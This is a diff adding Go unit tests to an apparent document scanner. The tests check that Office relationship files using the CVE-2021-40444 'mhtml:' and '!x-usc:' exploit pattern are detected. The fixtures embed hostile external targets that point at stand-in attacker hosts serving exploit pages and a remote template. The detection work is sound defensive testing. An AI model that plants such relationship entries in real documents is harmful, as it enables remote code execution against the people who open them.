@@ -216,6 +216,73 @@ func TestOOXMLExternalRel_CumulativeCap(t *testing.T) {
 	}
 }
 
+// TestOOXMLMHTMLRel_Scheme checks that the CVE-2021-40444 mhtml: Target is
+// surfaced as the distinct OOXML-MHTML-REL marker (NOT the generic
+// OOXML-EXTERNAL-REL), and that the attacker URL is carried in the stream.
+func TestOOXMLMHTMLRel_Scheme(t *testing.T) {
+	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1"
+    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
+    Target="mhtml:http://attacker.example/exploit.html!x-usc:http://attacker.example/exploit.html"
+    TargetMode="External"/>
+</Relationships>`
+
+	buf := makeOOXMLWithRels(t, relsXML)
+	res := Extract(buf, time.Time{})
+	joined := bytes.Join(res.Streams, []byte("\n"))
+	if !bytes.Contains(joined, []byte("OOXML-MHTML-REL")) {
+		t.Fatalf("no OOXML-MHTML-REL stream for mhtml: target; got %q", joined)
+	}
+	if bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
+		t.Fatalf("mhtml: target wrongly emitted generic OOXML-EXTERNAL-REL too; got %q", joined)
+	}
+	if !bytes.Contains(joined, []byte("attacker.example/exploit.html")) {
+		t.Fatalf("mhtml URL missing from emitted stream; got %q", joined)
+	}
+}
+
+// TestOOXMLMHTMLRel_XUSCSelector checks the !x-usc: MHTML-fragment selector is
+// detected even when the outer scheme is a bare http:// (the selector is the tell).
+func TestOOXMLMHTMLRel_XUSCSelector(t *testing.T) {
+	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1"
+    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
+    Target="file://attacker.example/x.html!x-usc:file://attacker.example/x.html"
+    TargetMode="External"/>
+</Relationships>`
+
+	buf := makeOOXMLWithRels(t, relsXML)
+	res := Extract(buf, time.Time{})
+	joined := bytes.Join(res.Streams, []byte("\n"))
+	if !bytes.Contains(joined, []byte("OOXML-MHTML-REL")) {
+		t.Fatalf("no OOXML-MHTML-REL stream for !x-usc: target; got %q", joined)
+	}
+}
+
+// TestOOXMLMHTMLRel_PlainHTTPNoEmit is the negative case: an ordinary remote
+// http:// external rel must emit the GENERIC OOXML-EXTERNAL-REL, NOT the MHTML one.
+func TestOOXMLMHTMLRel_PlainHTTPNoEmit(t *testing.T) {
+	relsXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1"
+    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+    Target="http://evil.example/t.dotm"
+    TargetMode="External"/>
+</Relationships>`
+
+	buf := makeOOXMLWithRels(t, relsXML)
+	res := Extract(buf, time.Time{})
+	joined := bytes.Join(res.Streams, []byte("\n"))
+	if bytes.Contains(joined, []byte("OOXML-MHTML-REL")) {
+		t.Fatalf("plain http:// rel wrongly emitted OOXML-MHTML-REL; got %q", joined)
+	}
+	if !bytes.Contains(joined, []byte("OOXML-EXTERNAL-REL")) {
+		t.Fatalf("plain http:// rel should still emit generic OOXML-EXTERNAL-REL; got %q", joined)
+	}
+}
+
 // TestOOXMLExternalRel_MalformedRels ensures a .rels with invalid XML is
 // silently skipped (fail-open) and does not cause a Failed or Panicked flag.
 func TestOOXMLExternalRel_MalformedRels(t *testing.T) {
